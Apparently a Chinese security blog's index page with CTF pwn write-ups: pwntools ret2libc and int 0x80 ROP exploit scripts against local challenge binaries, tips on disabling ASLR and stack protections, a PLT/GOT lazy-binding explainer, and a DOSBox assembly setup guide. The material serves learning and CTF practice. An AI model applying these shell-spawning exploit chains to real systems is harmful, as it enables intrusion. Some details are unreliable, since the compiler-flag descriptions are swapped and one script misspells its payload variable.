<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1574664880977-b87b80fb-e80a-43ad-b6c6-22fad2b1bda8.png" alt="image.png"></p>
<p>写 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">rdi_offset=<span class="number">0x0000000000021102</span></span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'symbol: '</span>)</span><br><span class="line">p.sendline(<span class="string">'system'</span>)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">sys_addr=p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>)</span><br><span class="line">sys_addr=int(sys_addr,<span class="number">16</span>)</span><br><span class="line">libc=LibcSearcher(<span class="string">'system'</span>,sys_addr)</span><br><span class="line">libc_base=sys_addr-libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_addr=libc_base+libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">rdi_addr=libc_base+rdi_offset</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">8</span>+p64(rdi_addr)+p64(bin_addr)+p64(sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'): '</span>)</span><br><span class="line">length=len(payload)</span><br><span class="line"><span class="keyword">print</span> length</span><br><span class="line"><span class="keyword">print</span> str(length)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>大佬的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">ropbaby = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfuncaddress</span><span class="params">(func)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'symbol: '</span>)</span><br><span class="line">    sh.sendline(func)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    addr = sh.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> int(addr, <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addropbuff</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'): '</span>)</span><br><span class="line">    length = len(payload)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">rdi_ret_offset = <span class="number">0x0000000000021102</span></span><br><span class="line">system_addr = getfuncaddress(<span class="string">'system'</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">'system'</span>, system_addr)</span><br><span class="line">libc_base = system_addr - libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc.dump(<span class="string">'str_bin_sh'</span>) + libc_base</span><br><span class="line">rdi_ret = rdi_ret_offset + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(system_addr), hex(binsh_addr), hex(rdi_ret)</span><br><span class="line">payload = flat([<span class="string">'b'</span> * <span class="number">8</span>, rdi_ret, binsh_addr, system_addr])</span><br><span class="line">addropbuff(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/14/PWN-Tips-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/14/PWN-Tips-1/" class="post-title-link" itemprop="url">PWN-Tips-1</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-14 08:32:06" itemprop="dateCreated datePublished" datetime="2020-02-14T08:32:06-08:00">2020-02-14</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-02-15 00:33:50" itemprop="dateModified" datetime="2020-02-15T00:33:50-08:00">2020-02-15</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="题目源码编译"><a href="#题目源码编译" class="headerlink" title="题目源码编译"></a>题目源码编译</h2><p>如果希望什么保护都没有的编译命令一般是：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-m32</code>的意思是编译为32位的程序，64位操作系统有时候需要安装兼容包</li>
<li><code>-fno-stack-protector</code>会关闭DEP</li>
<li><code>-z execstack</code>会关闭Stack Protector</li>
</ul>
<p>在root权限下执行，或者sudo执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>这样就关闭掉了整个系统的ASLR</p>
<h2 id="gdb调试内存"><a href="#gdb调试内存" class="headerlink" title="gdb调试内存"></a>gdb调试内存</h2><p>gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行程序的时候，buf的位置会固定在别的地址上，这里采用的方法是开启：core dump</p>
<p>在root权限下执行，或者sudo执行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br></pre></td></tr></table></figure>

<p>开启之后，当出现内存错的时候，系统会生成一个core dump文件在当前目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了，使用gdb调试转储：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb name core</span><br></pre></td></tr></table></figure>

<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><p>Linux的系统调用通过<code>int 80h</code>实现，用系统调用号来区分入口函数。应用程序调用系统调用的过程是：</p>
<ul>
<li>把系统调用的编号存入EAX</li>
<li>把函数参数存入其它通用寄存器</li>
<li>触发0x80号中断（int 0x80）</li>
</ul>
<p>那么我们如果希望通过系统调用来获取shell就需要把系统调用的参数放入各个寄存器，然后执行int 0x80就可以了</p>
<p>如果说想通过系统调用执行的是：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>（32位程序）</p>
<p>那么eax寄存器应该存放系统调用号，查看execve的系统调用号：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>

<p>可以得到为11，转换为16进制就为0xb，所以eax中应该存放0xb</p>
<p>ebx应该存放想要执行的”/bin/sh”的地址，还有两个参数设置为0</p>
<p>所以现在需要做的就是让：</p>
<ul>
<li>eax=0xb</li>
<li>ebx=”/bin/sh”的地址</li>
<li>ecx=0</li>
<li>edx=0</li>
</ul>
<p>只需要让栈顶的值是0xb然后可以通过pop eax达到目的，要用ROPgadget来查找，使用命令找到pop eax：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget	--binary rop --only 'pop|ret' | grep 'eax'</span><br></pre></td></tr></table></figure>

<p>类似的，通过这条命令寻找控制其它寄存器的地址，找到可以控制多个的。同时使用找到字符串在什么地方</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget	--binary rop --string '/bin/sh'</span><br></pre></td></tr></table></figure>

<p>以及还有需要的int 0x80</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget	--binary rop --only 'int'</span><br></pre></td></tr></table></figure>

<p>类似的exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">paylaod=<span class="string">'a'</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_addr)+p32(int_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">int_addr=<span class="number">0x8049421</span></span><br><span class="line">bin_addr=<span class="number">0x80be408</span></span><br><span class="line">paylaod=flat([<span class="string">'a'</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_other_ret,<span class="number">0</span>,<span class="number">0</span>,bin_addr,int_addr])</span><br><span class="line"><span class="comment">#flat模块能将patten字符串和地址结合并且转换为字节模式</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>栈的布局就是：</p>
<table>
<thead>
<tr>
<th align="center">Low Address</th>
</tr>
</thead>
<tbody><tr>
<td align="center">“A”*112</td>
</tr>
<tr>
<td align="center">pop_eax_ret</td>
</tr>
<tr>
<td align="center">0xb</td>
</tr>
<tr>
<td align="center">pop_edx_ecx_ebx_ret</td>
</tr>
<tr>
<td align="center">0</td>
</tr>
<tr>
<td align="center">0</td>
</tr>
<tr>
<td align="center">/bin/sh</td>
</tr>
<tr>
<td align="center">int 0x80</td>
</tr>
<tr>
<td align="center"><strong>High Address</strong></td>
</tr>
</tbody></table>
<h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT&amp;GOT"></a>PLT&amp;GOT</h3><p>以printf函数为例，运行时进行重定位是无法修改代码段的，只能将printf重定位到数据段，但是已经编译好的程序，调用printf的时候怎么才能找到这个地址呢。链接器会额外生成一小段代码，通过这段代码来获取printf()的地址，就像下面那样，进行链接的时候只需要对printf_stub()经行重定位操作就可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">;调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">	mov rax,[printf函数的存储地址]	;获取printf重定位之后的地址</span><br><span class="line">	jmp rax;跳过去执行printf函数</span><br><span class="line">	</span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的存储地址，这里存储printf重定位后的地址</span><br></pre></td></tr></table></figure>

<p>总体来说，动态链接每个函数需要两个东西：</p>
<ul>
<li>用来存放外部函数地址的数据段</li>
<li>用来获取数据段记录的外部函数地址的代码</li>
</ul>
<p>对应有两个表，一个用来存放外部的函数地址的数据表称为<strong>全局偏移表</strong>（GOT，Global Offset Table），那个存放额外代码的表成为程序链接表（PLT，Procedure Link Table）</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720200214210409.png" alt></p>
<p>可执行文件里面保存的是PLT表的地址，对应PTL地址指向的是GOT的地址，GOT表指向的就是glibc中的地址。那我们可以发现，在这里面想要通过PLT表获取函数的地址，首先要保证GOT表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，Linux引入了延迟绑定机制</p>
<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>只有在动态库函数在被调用时，才会地址解析和重定位工作，为此可以用类似这样的代码来实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始没有重定位的时候将printf@got填成lookup_printf的地址</span></span><br><span class="line"><span class="keyword">void</span> <span class="built_in">printf</span>@got()</span><br><span class="line">&#123;</span><br><span class="line">    address_good:</span><br><span class="line">    	jmp *<span class="built_in">printf</span>@got</span><br><span class="line">    lookup_printf:</span><br><span class="line">    	<span class="comment">//调用重定位函数查找printf地址，并写到printf@got</span></span><br><span class="line">    	<span class="keyword">goto</span> address_good;<span class="comment">//再返回去执行address_good</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明一下这段代码工作流程，一开始<code>printf@got</code>是<code>lookup_printf</code>函数的地址，这个函数用来寻找<code>printf()</code>的地址，然后写入<code>printf@got</code>，<code>lookup_printf</code>执行完成后会返回到<code>address_good</code>，这样再jmp的话就可以直接跳到<code>printf</code>来执行了</p>
<p>也就是说，如果不知道printf的地址，就去找一下，知道的话就直接去jmp执行printf了</p>
<p>接下来，我们就来看一下这个”找”的工作是怎么实现的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line"> 80482d0:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> 80482d6:	ff 25 08 a0 04 08    	jmp    *0x804a008</span><br><span class="line"> 80482dc:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">080482e0 &lt;puts@plt&gt;:</span><br><span class="line"> 80482e0:	ff 25 0c a0 04 08    	jmp    *0x804a00c</span><br><span class="line"> 80482e6:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 80482eb:	e9 e0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br><span class="line"></span><br><span class="line">080482f0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80482f0:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 80482f6:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 80482fb:	e9 d0 ff ff ff       	jmp    80482d0 &lt;_init+0x28&gt;</span><br></pre></td></tr></table></figure>

<p>ps.这里 plt 表的第一项使用 objdump 的时候给没有符号名的一项自动改成了离他最近的一项，为了避免引起误会，改成了 common，而且随着不断深入，会发现，确实可以叫 common</p>
<p>其中除第一个表项以外，plt 表的第一条都是跳转到对应的 got 表项，而 got 表项的内容我们可以通过 gdb 来看一下，如果函数还没有执行的时候，这里的地址是对应 plt 表项的下一条命令，即 push 0x0</p>
<p>还记得之前我们说的，在还没有执行过函数之前<code>printf@got</code>的内容是<code>lookup_printf</code>函数的地址，这就是要去找<code>printf</code>函数的地址了</p>
<p>现在要做的是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   $0x0    ;将数据压到栈上，作为将要执行的函数的参数</span><br><span class="line">jmp    0x80482d0   ;去到了第一个表项</span><br></pre></td></tr></table></figure>

<p>接下来继续</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">080482d0 &lt;common@plt&gt;:</span><br><span class="line">pushl  0x804a004  ;将数据压到栈上，作为后面函数的参数</span><br><span class="line">jmp    *0x804a008 ;跳转到函数</span><br><span class="line">add    %al,(%eax)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>我们同样可以使用 gdb 来看一下这里面到底是什么，可以看到，在没有执行之前是全 0</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png" alt="image.png"></p>
<p>当执行后他有了值</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png" alt="image.png"></p>
<p>这个值对应的函数是 <code>_dl_runtime_resolve</code></p>
<p>那现在做一个小总结：</p>
<p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve</span><br></pre></td></tr></table></figure>

<p>到这里我们还需要知道</p>
<ol>
<li><code>_dl_runtime_resolve</code> 是怎么知道要查找 printf 函数的</li>
<li><code>_dl_runtime_resolve</code> 找到 printf 函数地址之后，它怎么知道回填到哪个 GOT 表项</li>
</ol>
<p>第一个问题，在 xxx@plt 中，我们在 jmp 之前 push 了一个参数，每个 xxx@plt 的 push 的操作数都不一样，那个参数就相当于函数的<strong>id</strong>，告诉了<code>_dl_runtime_resolve</code>要去找哪一个函数的地址</p>
<p>在 elf 文件中 .rel.plt 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png" alt="image.png"></p>
<p>这里有些问题，对应着大佬博客说 plt 中 push 的操作数，就是对应函数在.rel.plt 段的偏移量，但是没对比出来</p>
<p>第二个问题，看 .rel.plt 的位置就对应着 xxx@plt 里 jmp 的地址</p>
<blockquote>
<p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p>
<p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong> </p>
<p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong> </p>
<p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p>
<p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p>
</blockquote>
<p><strong>跟着大佬的流程图来走一遍：</strong></p>
<p>第一次调用</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg" alt="img"></p>
<p>之后再次调用<img src="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg" alt="img"></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/12/Win10-64bit╧┬80x86╗π▒α╗╖╛│╦┘│╔/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/12/Win10-64bit╧┬80x86╗π▒α╗╖╛│╦┘│╔/" class="post-title-link" itemprop="url">Win10-64bit下80x86汇编环境速成</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-12 00:57:29 / Geändert am: 16:58:14" itemprop="dateCreated datePublished" datetime="2020-02-12T00:57:29-08:00">2020-02-12</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>众所周知Windows只有较为古老的32位系统才提供对16位系统的兼容，现在普遍安装的64位操作系统需要一个开源的模拟环境DOSBOX来进行16位DOS环境的汇编学习操作</p>
<h2 id="工具包准备"><a href="#工具包准备" class="headerlink" title="工具包准备"></a>工具包准备</h2><p>这里提供一个封装好所有必备工具的DOSBOX：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1vuyNo9Benp9mXCIp5WM7Zg </span><br><span class="line">提取码：o8jg</span><br></pre></td></tr></table></figure>

<p>第一次双击该图标运行，就可以发现桌面生成了DOSBOX的快捷方式，点击运行即可进入</p>
<p>如果使用原版DOSBOX需要自行安装Link、MASM、DEBUG等程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1S6bVvZA7dtISyoTTCyAawA </span><br><span class="line">提取码：vke6</span><br></pre></td></tr></table></figure>

<h2 id="目录挂载"><a href="#目录挂载" class="headerlink" title="目录挂载"></a>目录挂载</h2><h3 id="原版DOSBOX"><a href="#原版DOSBOX" class="headerlink" title="原版DOSBOX"></a>原版DOSBOX</h3><p>在你的硬盘上规划一小块地方，专门作为dosbox的工作目录，比如，我的目录是D:/masm，然后你需要挂载工作目录并让dosbox每次启动时都挂载它，进入dosbox的安装目录，找到DOSBox 0.74 Options.bat文件，双击打开它，然后会看到一个txt文件，在文件末尾加入以下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount d d:masm  //标示将你硬盘的e:masm目录作为DOS系统的D盘，挂载到DOS系统上</span><br><span class="line">d:            //表示切换到dos系统的D盘，实际上就是切换到你硬盘的 e:masm目录，就是你的工作目录</span><br></pre></td></tr></table></figure>

<h3 id="封装版DOSBOX"><a href="#封装版DOSBOX" class="headerlink" title="封装版DOSBOX"></a>封装版DOSBOX</h3><p>每次运行DOSBOX我们都需要手动经行挂载，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:/&gt;mount e d:masm</span><br><span class="line">Drive E is mounted as local directory d:masm\</span><br><span class="line">C:/&gt;E:</span><br><span class="line">E:/&gt;</span><br></pre></td></tr></table></figure>

<p>就可进入我们的工作目录</p>
<h2 id="编译-链接-运行"><a href="#编译-链接-运行" class="headerlink" title="编译-链接-运行"></a>编译-链接-运行</h2><p>我们以一个名称为<code>2^3.asm</code>的源代码为样本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line">start:	mov ax,2		</span><br><span class="line">		add ax,ax</span><br><span class="line">		add ax,ax		</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>首先运行masm生成obj文件，在DOS系统中可以用Tab键自动补齐</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CODE&gt;masm 2^3.ASM</span><br></pre></td></tr></table></figure>

<p>然后一路回车就完事了，然后运行link经行程序链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CODE&gt;link 2^3.OBJ</span><br></pre></td></tr></table></figure>

<p>就已经生成了EXE可执行文件，然后用debug调试运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\CODE&gt;debug 2^3.EXE</span><br></pre></td></tr></table></figure>

<p>使用t即可开始单步调试运行</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/10/8086╗π▒α▒╩╝╟06/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/10/8086╗π▒α▒╩╝╟06/" class="post-title-link" itemprop="url">8086汇编笔记06</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

